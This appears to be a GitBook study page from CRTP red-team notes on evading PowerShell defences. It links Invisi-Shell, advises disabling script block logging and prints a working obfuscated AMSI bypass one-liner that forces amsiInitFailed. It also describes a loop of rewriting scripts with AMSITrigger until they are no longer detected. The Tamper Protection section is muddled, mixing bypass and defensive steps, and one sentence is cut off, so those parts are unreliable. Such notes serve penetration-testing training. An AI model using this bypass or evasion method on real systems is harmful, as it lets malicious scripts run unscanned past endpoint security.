---
description: >-
  Discover the intricacies of CRTP PowerShell Detections in our in-depth
  article. Learn about its importance, applications, and methodologies for
  effective cybersecurity management.
cover: ../.gitbook/assets/RFS (2).png
coverY: 0
---

# 😅 PowerShell Detections

```
https://github.com/OmerYa/Invisi-Shell
```

{% hint style="warning" %}
```
Contact me on LinkedIn : https://cli-ck.me/rfs
```
{% endhint %}

### Using Invisi Shell

With admin privileges:

```
RunWithPathAsAdmin.bat
```

With non admin privileges:

```
RunWithRegistryNonAdmin.bat
```

### System-Wide Transcription

#### Script Block Logging

Disable script block logging to prevent PowerShell from recording potentially sensitive scripts as they are executed. This can be done through group policy settings or registry modifications.

### AntiMalaware Scan Interface - AMSI

The provided script snippet is designed to bypass AMSI, which could allow malicious scripts to execute without being scanned and potentially detected by AMSI. Users should execute this with extreme caution, as it lowers your system's defenses against malware.

{% code overflow="wrap" %}
```
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```
{% endcode %}

### Constrained Language Mode - CLM

To work around CLM:

1. Use AMSITrigger to identify which parts of your script are detected by AMSI.
2. Modify these parts and test again with AMSITrigger.
3. Continue this process until your script is no longer detected by AMSI.

The steps to avoid signature-based detection are pretty simple:&#x20;

1\) Scan using AMSITrigger&#x20;

2\) Modify the detected code snippet&#x20;

3\) Rescan using AMSITrigger&#x20;

4\) Repeat the steps 2 & 3 till we get a result as “AMSI\_RESULT\_NOT\_DETECTED” or “

### Tamper Protection

Tamper Protection is a feature that prevents unauthorized changes to key security features, including disabling script block logging and system-wide transcription settings. To bypass Tamper Protection:

1. Carefully modify security settings with appropriate administrative credentials.
2. Employ sophisticated methods to alter or add registry keys related to Tamper Protection.
3. Monitor changes and revert any suspicious modifications by unauthorized processes.
4. Ensure continuous validation of the integrity and authenticity of security-related configurations.

Please note, that bypassing Tamper Protection can make your system vulnerable to attacks and should only be done by experienced individuals or for educational purposes in a controlled environment.

#### Testing with AMSITrigger:

To effectively test your changes without triggering the AMSI:

1. Run `AMSITrigger` to test the initial script or command.
2. Based on the feedback, modify the flagged code segments to avoid AMSI detection.
3. Re-run `AMSITrigger` to verify that the changes are sufficient.
4. If detection still occurs, repeat the modification process until an undetected state is achieved.

#### Final Notes

Always ensure that you have proper authorization before attempting to adjust or bypass security features. Unauthorized tampering with security settings is illegal and unethical and could lead to severe consequences.
